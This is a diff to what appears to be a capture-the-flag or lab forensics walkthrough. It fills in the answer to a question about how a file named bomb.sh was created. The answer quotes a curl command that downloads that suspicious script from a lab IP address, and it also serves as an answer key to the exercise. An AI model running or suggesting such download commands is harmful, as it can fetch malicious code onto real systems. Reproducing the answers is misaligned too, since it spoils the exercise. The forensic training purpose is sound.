@@ -109,7 +109,11 @@ A suspiciously named file, no?
 
 ### What is the command used that created the file `bomb.sh`?
 
-**Answer**:
+The answer to this question is found in the line above the answer to the previous question:
+
+![](/assets/img/uploads/curl-bomb.sh.png)
+
+**Answer**: `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`
 
 ### The file was renamed and moved to a different directory. What is the full path of this file now?
 
